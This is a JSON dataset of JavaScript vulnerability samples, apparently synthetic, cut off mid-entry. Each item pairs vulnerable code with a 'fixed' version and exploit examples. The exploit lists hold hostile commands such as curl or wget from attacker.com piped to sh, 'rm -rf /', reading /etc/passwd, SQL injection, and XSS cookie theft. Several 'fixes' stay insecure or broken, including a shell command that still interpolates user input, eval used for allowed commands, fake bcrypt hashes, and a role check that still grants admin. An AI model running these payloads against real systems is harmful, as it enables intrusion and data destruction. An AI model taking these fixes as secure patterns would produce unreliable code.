{
    "javascript_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "{\"use strict\";const express=require(\\\"express\\\");const app=express();app.use(express.json());app.post(\\\"/exec\\\",(req,res)=>{try{const {command}=req.body;require(\\\"child_process\\\").exec(command,(error,stdout,stderr)=>{if(error){return res.status(500).json({error:stderr});}res.send(stdout);});}catch(e){res.status(400).send(e.message);}});app.listen(3000,()=>console.log(\\\"Server running on port 3000\\\"));}",
        "cvss_score": 8.6,
        "fixed_code": "{\"use strict\";const express=require(\\\"express\\\");const app=express();const { exec } = require(\\\"child_process\\\");app.use(express.json());app.post(\\\"/exec\\\",(req,res)=>{try{const allowedCommands=[\\\"ls\\\", \\\"whoami\\\"];const {command}=req.body;if(!allowedCommands.includes(command)){return res.status(403).send(\\\"Command not allowed\\\");}exec(command,(error,stdout,stderr)=>{if(error){return res.status(500).json({error:stderr});}res.send(stdout);});}catch(e){res.status(400).send(e.message);}});app.listen(3000,()=>console.log(\\\"Server running on port 3000\\\"));}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files.",
            "They can use 'curl attacker.com/malware.sh | sh' to run malicious scripts.",
            "Chaining commands like 'ls; cat /etc/passwd' could leak sensitive information."
        ]
    },
    "javascript_1": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "class User {\n    constructor(name, isAdmin) {\n        this.name = name;\n        this.isAdmin = isAdmin;\n    }\n\n    promote() {\n        if (this.name === \"admin\") {\n            this.isAdmin = true;\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class User {\n    constructor(name, isAdmin) {\n        this.name = name;\n        this.isAdmin = isAdmin;\n    }\n\n    promote() {\n        if (this.name === \"admin\" && this.isAuthorized()) {\n            this.isAdmin = true;\n        }\n    }\n\n    isAuthorized() {\n        // Implement proper authorization logic here\n        return false; // Placeholder for actual check\n    }\n}",
        "exploit_ways": [
            "An attacker can create a new User object with the name 'admin' and call promote to gain admin privileges.",
            "If user input is used to set the name, an attacker could directly inject 'admin' as their username.",
            "Exploiting any pre-existing vulnerabilities that allow unauthorized manipulation of User objects."
        ]
    },
    "javascript_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "const fs = require('fs');\n\nfunction updateUserRole(userId, role) {\n    if (role !== 'admin') return;\n    const data = JSON.parse(fs.readFileSync('users.json', 'utf8'));\n    const user = data.find(u => u.id === userId);\n    if (!user) return;\n    user.role = role;\n    fs.writeFileSync('users.json', JSON.stringify(data, null, 2));\n}\n\nif (process.argv.length > 3) {\n    updateUserRole(process.argv[2], process.argv[3]);\n}",
        "cvss_score": 7.5,
        "fixed_code": "const fs = require('fs');\n\nfunction updateUserRole(userId, role) {\n    const allowedRoles = ['admin', 'user'];\n    if (!allowedRoles.includes(role)) return;\n    const data = JSON.parse(fs.readFileSync('users.json', 'utf8'));\n    const user = data.find(u => u.id === userId);\n    if (!user) return;\n    user.role = role;\n    fs.writeFileSync('users.json', JSON.stringify(data, null, 2));\n}\n\nif (process.argv.length > 3) {\n    updateUserRole(process.argv[2], process.argv[3]);\n}",
        "exploit_ways": [
            "An attacker can supply an unexpected role value like 'superadmin' to gain unauthorized privileges.",
            "By providing a crafted userId that doesn't exist, the function may not properly handle the error, allowing for potential further exploitation.",
            "Using process injection techniques, an attacker could manipulate command-line arguments to escalate their user's role."
        ]
    },
    "javascript_3": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\napp.use(express.json());\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'testdb'\n});\n\nconnection.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to MySQL database!');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username || '';\n  const password = req.body.password || '';\n  \n  // Complex obfuscation and encoding to make detection harder\n  const encodedUsername = Buffer.from(username).toString('base64');\n  const decodedUsername = Buffer.from(encodedUsername, 'base64').toString();\n  \n  const query = `SELECT * FROM users WHERE username='${decodedUsername}' AND password='${password}'`;\n  \n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "cvss_score": 8.6,
        "fixed_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\napp.use(express.json());\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'testdb'\n});\n\nconnection.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to MySQL database!');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username || '';\n  const password = req.body.password || '';\n  \n  connection.query('SELECT * FROM users WHERE username=? AND password=?', [username, password], (error, results) => {\n    if (error) throw error;\n    if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can send a POST request with 'username=admin' and 'password=' OR '1'='1' to bypass authentication.",
            "They could use SQL injection payloads like 'admin' -- to comment out the rest of the query, potentially granting unauthorized access.",
            "A payload such as 'admin'; DROP TABLE users; -- can be used to delete critical data from the database."
        ]
    },
    "javascript_4": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<script>\nfunction displayUserInput() {\n    var userInput = document.getElementById('userInput').value;\n    document.getElementById('output').innerHTML = userInput;\n}\n</script>\n<input type='text' id='userInput'>\n<button onclick='displayUserInput()'>Submit</button>\n<div id='output'></div>",
        "cvss_score": 6.1,
        "fixed_code": "<script>\nfunction displayUserInput() {\n    var userInput = document.getElementById('userInput').value;\n    document.getElementById('output').textContent = userInput;\n}\n</script>\n<input type='text' id='userInput'>\n<button onclick='displayUserInput()'>Submit</button>\n<div id='output'></div>",
        "exploit_ways": [
            "An attacker can inject a script tag like '<script>alert(\\'XSS\\')</script>' to execute arbitrary JavaScript.",
            "Can use '<img src=x onerror=alert(1)>' to trigger an alert in browsers that do not filter the 'onerror' attribute.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click here</a>' can steal user cookies when clicked."
        ]
    },
    "javascript_5": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseQuery {\\n    constructor(connectionString) {\\n        this.connectionString = connectionString;\\n    }\\n\\n    getUser(userId) {\\n        const query = `SELECT * FROM users WHERE id = ${userId}`;\\n        // Execute the query (vulnerable to SQL injection)\\n        return this.executeQuery(query);\\n    }\\n\\n    executeQuery(query) {\\n        // Simulate database execution\\n        console.log(`Executing: ${query}`);\\n        return {};\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class DatabaseQuery {\\n    constructor(connectionString) {\\n        this.connectionString = connectionString;\\n    }\\n\\n    getUser(userId) {\\n        const query = 'SELECT * FROM users WHERE id = ?';\\n        // Execute the query safely with parameterized queries\\n        return this.executeQuery(query, [userId]);\\n    }\\n\\n    executeQuery(query, params) {\\n        // Simulate database execution with parameters\\n        console.log(`Executing: ${query} with params:`, params);\\n        return {};\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user records.",
            "They could use '1; DROP TABLE users' to delete the users table.",
            "Input like '1 UNION SELECT password FROM admin_users' can extract passwords from another table."
        ]
    },
    "javascript_6": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "const fs = require('fs');\nfunction updateUserRole(userId, role) {\n    const filePath = `/home/user/data/users/${userId}.json`;\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) throw err;\n        const user = JSON.parse(data);\n        if (user.isAdmin && role === 'admin') {\n            user.role = role;\n            fs.writeFile(filePath, JSON.stringify(user), (err) => {\n                if (err) throw err;\n            });\n        }\n    });\n}",
        "cvss_score": 7.8,
        "fixed_code": "const fs = require('fs');\nfunction updateUserRole(userId, role) {\n    const filePath = `/home/user/data/users/${userId}.json`;\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) throw err;\n        const user = JSON.parse(data);\n        if (user.isAdmin && ['admin', 'user'].includes(role)) {\n            user.role = role;\n            fs.writeFile(filePath, JSON.stringify(user), (err) => {\n                if (err) throw err;\n            });\n        }\n    });\n}",
        "exploit_ways": [
            "An attacker with a valid admin account can change their role to 'admin' in the JSON file directly.",
            "By exploiting a path traversal vulnerability, an attacker might be able to modify other user files and escalate privileges.",
            "If the application does not validate input properly elsewhere, an attacker could craft malicious inputs leading to privilege escalation."
        ]
    },
    "javascript_7": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileManager {\\n    readfile(filePath) {\\n        const fs = require('fs');\\n        return fs.readFileSync(filePath, 'utf8');\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileManager {\\n    constructor(basePath) {\\n        this.basePath = basePath;\\n    }\\n    readfile(filePath) {\\n        const fs = require('fs');\\n        const path = require('path');\\n        const fullPath = path.join(this.basePath, filePath);\\n        if (!fullPath.startsWith(this.basePath)) {\\n            throw new Error('Invalid file path');\\n        }\\n        return fs.readFileSync(fullPath, 'utf8');\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '../../etc/passwd' to read the system's passwd file.",
            "They could use '..%2f..%2fetc%2fshadow' URL-encoded path to access shadow file if web application is vulnerable.",
            "By providing '../config/database.ini', an attacker might retrieve sensitive database connection details."
        ]
    },
    "javascript_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.get('/execute', (req, res) => {\n    const command = req.query.cmd;\n    const { exec } = require('child_process');\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n        } else {\n            res.send(stdout);\n        }\n    });\n});\napp.listen(3000);",
        "cvss_score": 7.5,
        "fixed_code": "const express = require('express');\nconst app = express();\nconst { exec } = require('child_process');\nconst allowedCommands = ['ls', 'whoami'];\napp.get('/execute', (req, res) => {\n    const command = req.query.cmd;\n    if (!allowedCommands.includes(command)) {\n        return res.send('Command not allowed');\n    }\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n        } else {\n            res.send(stdout);\n        }\n    });\n});\napp.listen(3000);",
        "exploit_ways": [
            "User could input 'whoami' to get the username of the server.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.",
            "Could use 'rm -rf /' to delete all files on the system."
        ]
    },
    "javascript_9": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "const data = JSON.parse(window.localStorage.getItem('userSettings'));\nconsole.log(data.user.name);",
        "cvss_score": 7.5,
        "fixed_code": "const serializedData = window.localStorage.getItem('userSettings');\ntry {\n    const data = JSON.parse(serializedData);\n    if (data && typeof data.user === 'object' && typeof data.user.name === 'string') {\n        console.log(data.user.name);\n    } else {\n        throw new Error('Invalid data format');\n    }\n} catch (e) {\n    console.error('Failed to parse user settings:', e);\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON that causes a JavaScript error or unexpected behavior.",
            "By crafting the payload, an attacker might execute arbitrary code if additional vulnerabilities exist in the application.",
            "Injecting a large object could cause a denial of service (DoS) by consuming excessive memory resources."
        ]
    },
    "javascript_10": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth {\\n    constructor(username, password) {\\n        this.username = username;\\n        this.password = password;\\n    }\\n\\n    login(inputUsername, inputPassword) {\\n        if (inputUsername === this.username && inputPassword === this.password) {\\n            return true;\\n        } else {\\n            return false;\\n        }\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "const bcrypt = require('bcrypt');\\nclass UserAuth {\\n    constructor(username, password) {\\n        this.username = username;\\n        this.passwordHash = bcrypt.hashSync(password, 10);\\n    }\\n\\n    login(inputUsername, inputPassword) {\\n        return this.username === inputUsername && bcrypt.compareSync(inputPassword, this.passwordHash);\\n    }\\n}",
        "exploit_ways": [
            "An attacker with knowledge of the username can brute-force the password.",
            "If the username is not unique, an attacker could guess common passwords across multiple accounts.",
            "By observing response times during login attempts, an attacker might infer if a username exists."
        ]
    },
    "javascript_11": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet users = [{ username: 'admin', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.json({ message: 'Login successful' });\n    } else {\n        res.status(401).json({ message: 'Invalid credentials' });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "cvss_score": 7.5,
        "fixed_code": "const express = require('express');\nconst bcrypt = require('bcryptjs');\nconst app = express();\napp.use(express.json());\n\nlet users = [{ username: 'admin', password: '$2a$10$cWBbXvUfGdJN4Y5RQlZKtePwzD9.7k6t3cQoWwF8A3kV0e6L0.ATq' }];\n\napp.post('/login', async (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    if (user && await bcrypt.compare(password, user.password)) {\n        res.json({ message: 'Login successful' });\n    } else {\n        res.status(401).json({ message: 'Invalid credentials' });\n    }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "exploit_ways": [
            "An attacker can try common password combinations to brute force the login.",
            "Using a rainbow table attack, they could attempt to crack hashed passwords if stored insecurely.",
            "If user enumeration is possible, attackers can gather valid usernames and focus their brute force attempts."
        ]
    },
    "javascript_12": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "const untrustedData = JSON.parse(window.localStorage.getItem('userSettings'));\nif (untrustedData && untrustedData.settings) {\n    Object.assign({}, untrustedData.settings);\n}",
        "cvss_score": 8.1,
        "fixed_code": "const userSettingsString = window.localStorage.getItem('userSettings');\nlet untrustedData = {};\ntry {\n    untrustedData = JSON.parse(userSettingsString);\n} catch (e) {\n    console.error(\"Invalid JSON data\", e);\n}\nif (untrustedData && typeof untrustedData.settings === 'object' && !Array.isArray(untrustedData.settings)) {\n    Object.assign({}, untrustedData.settings);\n}",
        "exploit_ways": [
            "An attacker could store malicious JSON in localStorage to execute arbitrary JavaScript code.",
            "By injecting a payload that overrides expected properties, an attacker can alter application behavior.",
            "A crafted payload might lead to denial of service by causing the application to consume excessive resources."
        ]
    },
    "javascript_13": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "function deserializeUser(data) {\n    const user = JSON.parse(data);\n    return new User(user.name, user.age, user.isAdmin);\n}\nclass User {\n    constructor(name, age, isAdmin) {\n        this.name = name;\n        this.age = age;\n        this.isAdmin = isAdmin;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "function deserializeUser(data) {\n    try {\n        const parsedData = JSON.parse(data);\n        if (typeof parsedData.name === 'string' && typeof parsedData.age === 'number' && typeof parsedData.isAdmin === 'boolean') {\n            return new User(parsedData.name, parsedData.age, parsedData.isAdmin);\n        } else {\n            throw new Error('Invalid data format');\n        }\n    } catch (e) {\n        throw new Error('Failed to deserialize user data: ' + e.message);\n    }\n}\nclass User {\n    constructor(name, age, isAdmin) {\n        this.name = name;\n        this.age = age;\n        this.isAdmin = isAdmin;\n    }\n}",
        "exploit_ways": [
            "An attacker could inject malicious JSON to manipulate user permissions by setting isAdmin to true.",
            "By injecting crafted JSON data, an attacker might be able to execute arbitrary code if the deserialized object is used in unsafe ways elsewhere in the application.",
            "The vulnerability can be exploited to perform privilege escalation attacks by modifying serialized objects that are sent over untrusted networks."
        ]
    },
    "javascript_14": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseConnector {\\n    constructor() {}\\n\\n    queryUserByUsername(username) {\\n        const sql = `SELECT * FROM users WHERE username = '${username}'`;\\n        // Simulate database execution\\n        console.log(sql);\\n        return [];\\n    }\\n}",
        "cvss_score": 8.9,
        "fixed_code": "class DatabaseConnector {\\n    constructor() {}\\n\\n    queryUserByUsername(username) {\\n        const sql = 'SELECT * FROM users WHERE username = $1';\\n        // Use a library like pg-promise or similar for parameterized queries\\n        console.log(sql);\\n        return [];\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to bypass authentication.",
            "They can use \"UNION SELECT password FROM users--\" to extract passwords.",
            "Input like \"; DROP TABLE users; --\" can delete the critical users table."
        ]
    },
    "javascript_15": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "class User {\\n    constructor(data) {\\n        Object.assign(this, data);\\n    }\\n}\\nconst data = JSON.parse('{\"__proto__\":{\"admin\":true}}');\\nconst user = new User(data);",
        "cvss_score": 7.5,
        "fixed_code": "class User {\\n    constructor(data) {\\n        this.username = data.username;\\n        this.email = data.email;\\n        // Add other properties as necessary without using Object.assign\\n    }\\n}\\nconst safeParse = (str) => {\\n    try {\\n        return JSON.parse(str, (key, value) => {\\n            if (typeof value === 'object' && value !== null && !Array.isArray(value)) {\\n                throw new Error('Invalid object structure');\\n            }\\n            return value;\\n        });\\n    } catch (e) {\\n        console.error('Invalid JSON provided', e);\\n        return {};\\n    }\\n};\\nconst data = safeParse('{\"username\":\"test\",\"email\":\"test@example.com\"}');\\nconst user = new User(data);",
        "exploit_ways": [
            "An attacker could inject malicious __proto__ properties to modify global object prototypes, leading to privilege escalation.",
            "By crafting specific JSON inputs, an attacker can manipulate the application's behavior or cause Denial of Service by consuming excessive resources.",
            "Using carefully crafted payloads, an attacker might be able to override critical properties in objects, causing unexpected behavior or unauthorized actions."
        ]
    },
    "javascript_16": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "function exploitUserPermissions() {\\n    if (window.location.hash) {\\n        var cmd = decodeURIComponent(window.location.hash.substring(1));\\n        new Function(cmd)();\\n    }\\n}",
        "cvss_score": 8.5,
        "fixed_code": "function safeExploitUserPermissions() {\\n    if (window.location.hash) {\\n        var allowedCommands = ['allowedCommand1', 'allowedCommand2'];\\n        var cmd = decodeURIComponent(window.location.hash.substring(1));\\n        if (allowedCommands.includes(cmd)) {\\n            // Execute only allowed commands safely\\n            eval(cmd);\\n        } else {\\n            console.log('Unauthorized command');\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject JavaScript code via the URL hash to execute arbitrary code in the user's context.",
            "Could use the injected code to steal cookies or other sensitive information from the user.",
            "Injecting malicious scripts could lead to further privilege escalation, potentially compromising the entire application."
        ]
    },
    "javascript_18": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'testdb'\n});\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id=${userId}`;\n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "cvss_score": 8.0,
        "fixed_code": "const express = require('express');\nconst mysql = require('mysql');\n\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'testdb'\n});\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  connection.query('SELECT * FROM users WHERE id=?', [userId], (error, results) => {\n    if (error) throw error;\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can inject SQL code via the 'id' query parameter to retrieve all user data.",
            "They could use a UNION SELECT statement to access additional tables or data.",
            "A DROP TABLE command can be injected to delete the users table from the database."
        ]
    },
    "javascript_19": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "\"use strict\";\nconst express = require('express');\nconst { exec } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/run-command', (req, res) => {\n    const command = `echo ${req.body.command}`;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "cvss_score": 8.2,
        "fixed_code": "\"use strict\";\nconst express = require('express');\nconst { exec } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/run-command', (req, res) => {\n    const allowedCommands = ['echo'];\n    if (!allowedCommands.includes(req.body.command)) {\n        res.status(403).send('Command not allowed');\n        return;\n    }\n    exec(`echo ${req.body.command}`, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "exploit_ways": [
            "An attacker could input '; rm -rf /' to delete all files on the server.",
            "They can use '; curl http://attacker.com/malware | sh' to execute remote malicious code.",
            "Input like '; cat /etc/passwd' could be used to leak sensitive system information."
        ]
    },
    "javascript_21": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class UserSession {\n    constructor(userId) {\n        this.userId = userId;\n    }\n    changeEmail(newEmail, token) {\n        if (this.validateToken(token)) {\n            // Simulate changing email\n            console.log(`Email changed to ${newEmail} for user ${this.userId}`);\n        } else {\n            throw new Error('Invalid token');\n        }\n    }\n    validateToken(token) {\n        // Simplified and insecure validation logic\n        return token === 'valid_token';\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class UserSession {\n    constructor(userId, csrfToken) {\n        this.userId = userId;\n        this.csrfToken = csrfToken;\n    }\n    changeEmail(newEmail, token) {\n        if (this.validateToken(token)) {\n            // Simulate changing email\n            console.log(`Email changed to ${newEmail} for user ${this.userId}`);\n        } else {\n            throw new Error('Invalid CSRF token');\n        }\n    }\n    validateToken(token) {\n        return token === this.csrfToken;\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious web page that sends a request to change the user's email without their knowledge.",
            "The attacker can use social engineering to trick the victim into clicking a link or visiting a site that triggers the CSRF attack.",
            "If the token validation is predictable, an attacker might guess or brute-force the valid token."
        ]
    },
    "javascript_22": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "function authenticate(user, pass) {\n    const users = {\"admin\": \"secret123\", \"user\": \"password456\"};\n    if (users[user] && pass === users[user]) {\n        return true;\n    }\n    return false;\n}",
        "cvss_score": 7.5,
        "fixed_code": "const bcrypt = require('bcrypt');\n\nfunction authenticate(user, pass) {\n    const users = {\"admin\": \"$2a$10$somesaltsecret123\", \"user\": \"$2a$10$othersaltpassword456\"};\n    if (users[user] && bcrypt.compareSync(pass, users[user])) {\n        return true;\n    }\n    return false;\n}",
        "exploit_ways": [
            "An attacker can use a brute force attack to guess the passwords stored in plain text.",
            "By analyzing the code, an attacker might see that passwords are not hashed and try common credentials.",
            "The vulnerability allows unauthorized access if the attacker finds out or guesses the correct username-password pair."
        ]
    },
    "javascript_23": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "function escalatePrivileges(userInput) { var command = \"sudo \"; if (userInput === 'admin') { command += 'chmod 777 /root'; } else { command += 'echo normal user'; } require('child_process').exec(command, function(error, stdout, stderr) { console.log(stdout); }); }",
        "cvss_score": 8.5,
        "fixed_code": "function escalatePrivileges(userInput) { if (userInput === 'admin') { var command = ['sudo', 'chmod', '777', '/root']; require('child_process').execFile(command[0], command.slice(1), function(error, stdout, stderr) { console.log(stdout); }); } else { console.log('normal user'); } }",
        "exploit_ways": [
            "An attacker could input '; rm -rf /' to delete all files on the system.",
            "They can use '; sudo su -' to gain a root shell immediately.",
            "Exploiting this, an attacker might execute '; wget http://attacker.com/malware.sh; sh malware.sh' to download and run malicious scripts."
        ]
    },
    "javascript_24": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "function authenticate(username, password) {\n    if (username === 'admin' && password === 'password123') {\n        return true;\n    }\n    return false;\n}",
        "cvss_score": 7.5,
        "fixed_code": "function authenticate(username, password) {\n    const validCredentials = { admin: 'hashed_password_here' };\n    if (validCredentials[username] && compareHash(password, validCredentials[username])) {\n        return true;\n    }\n    return false;\n}\n\nfunction compareHash(inputPassword, storedHash) {\n    // Implement a secure hash comparison function here\n}",
        "exploit_ways": [
            "An attacker can use the default 'admin' and 'password123' to gain unauthorized access.",
            "By analyzing the code, an attacker might guess other hardcoded usernames and passwords if they exist.",
            "If using this function in a web application, an attacker could automate login attempts (brute force) to find valid credentials."
        ]
    },
    "javascript_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\n    constructor() {}\n    start() {\n        const express = require('express');\n        const app = express();\n        app.get('/', (req, res) => {\n            res.send('<h1>Hello World</h1>');\n        });\n        app.listen(3000, () => {\n            console.log('Server is running on port 3000');\n        });\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class WebServer {\n    constructor() {}\n    start() {\n        const express = require('express');\n        const helmet = require('helmet');\n        const app = express();\n        app.use(helmet());\n        app.get('/', (req, res) => {\n            res.send('<h1>Hello World</h1>');\n        });\n        app.listen(3000, () => {\n            console.log('Server is running on port 3000');\n        });\n    }\n}",
        "exploit_ways": [
            "An attacker can perform Clickjacking attacks by default due to the lack of X-Frame-Options header.",
            "The server might be vulnerable to Cross-Site Scripting (XSS) as it does not set Content Security Policy headers.",
            "Without proper security headers, the server is susceptible to MIME-sniffing vulnerabilities."
        ]
    },
    "javascript_26": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "function endlessLoop() {\\n    while(true) {}\\n}\\nendlessLoop();",
        "cvss_score": 4.2,
        "fixed_code": "function controlledLoop(maxIterations) {\\n    for (let i = 0; i < maxIterations; i++) {}\\n}\\ncontrolledLoop(1000);",
        "exploit_ways": [
            "An attacker can trigger the endlessLoop function to consume CPU resources, leading to a Denial-of-Service.",
            "If this code is in a web context, it can cause the browser or server to freeze, affecting user experience and availability.",
            "In a multi-threaded environment, such a loop can exhaust system resources, impacting other processes."
        ]
    },
    "javascript_27": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "const http = require('http');\n\nfunction handleRequest(request, response) {\n    let data = '';\n    request.on('data', chunk => {\n        data += chunk.toString();\n    });\n    request.on('end', () => {\n        if (data.length > 1e6) {\n            for (let i = 0; i < 1000000; i++) {}\n        }\n        response.end('Hello World');\n    });\n}\n\nconst server = http.createServer(handleRequest);\nserver.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 4.2,
        "fixed_code": "const http = require('http');\n\nfunction handleRequest(request, response) {\n    let data = '';\n    request.on('data', chunk => {\n        if (data.length > 1e6) {\n            return response.writeHead(413).end();\n        }\n        data += chunk.toString();\n    });\n    request.on('end', () => {\n        response.end('Hello World');\n    });\n}\n\nconst server = http.createServer(handleRequest);\nserver.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can send a large payload to trigger the loop and exhaust CPU resources.",
            "By sending multiple requests with large payloads, the server may become unresponsive to legitimate users.",
            "Crafting specific payloads that exceed the buffer size can cause the server to terminate connections prematurely."
        ]
    },
    "javascript_28": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n    const url = req.query.url;\n    if (url && /^https?:\\/\\/(example\\.com|another\\.example\\.org)/.test(url)) {\n        res.redirect(url);\n    } else {\n        res.status(400).send('Invalid URL');\n    }\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "cvss_score": 6.5,
        "fixed_code": "const express = require('express');\nconst app = express();\n\nconst allowedDomains = ['example.com', 'another.example.org'];\n\napp.get('/redirect', (req, res) => {\n    const url = new URL(req.query.url);\n    if (allowedDomains.includes(url.hostname)) {\n        res.redirect(url.toString());\n    } else {\n        res.status(400).send('Invalid URL');\n    }\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can redirect users to a phishing site by using a valid subdomain of example.com or another.example.org.",
            "Crafting URLs with URL-encoded characters to bypass the regex check and redirect to an unauthorized domain.",
            "Using crafted query strings that exploit browser parsing vulnerabilities to perform redirection to malicious sites."
        ]
    },
    "javascript_29": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "class SessionManager {\n    constructor() {\n        this.sessions = {};\n    }\n\n    createSession(userId) {\n        const sessionId = this.generateSessionId();\n        this.sessions[sessionId] = { userId, createdAt: new Date() };\n        return sessionId;\n    }\n\n    generateSessionId() {\n        return Math.random().toString(36).substr(2, 16);\n    }\n\n    getSession(userId) {\n        for (const sessionId in this.sessions) {\n            if (this.sessions[sessionId].userId === userId) {\n                return sessionId;\n            }\n        }\n        return null;\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "class SessionManager {\n    constructor() {\n        this.sessions = {};\n    }\n\n    createSession(userId) {\n        const sessionId = this.generateSecureSessionId();\n        this.sessions[sessionId] = { userId, createdAt: new Date() };\n        return sessionId;\n    }\n\n    generateSecureSessionId() {\n        const crypto = require('crypto');\n        return crypto.randomBytes(16).toString('hex');\n    }\n\n    getSession(userId) {\n        for (const sessionId in this.sessions) {\n            if (this.sessions[sessionId].userId === userId) {\n                return sessionId;\n            }\n        }\n        return null;\n    }\n}",
        "exploit_ways": [
            "An attacker could set a session cookie to an existing session ID, potentially hijacking the user's session.",
            "By observing sessions in transit, an attacker might predict and use a predictable session ID to gain unauthorized access.",
            "In environments with shared machines, an attacker could set a session ID on a machine before the legitimate user logs in."
        ]
    },
    "javascript_30": {
        "vulnerability_type": "Missing Security Headers",
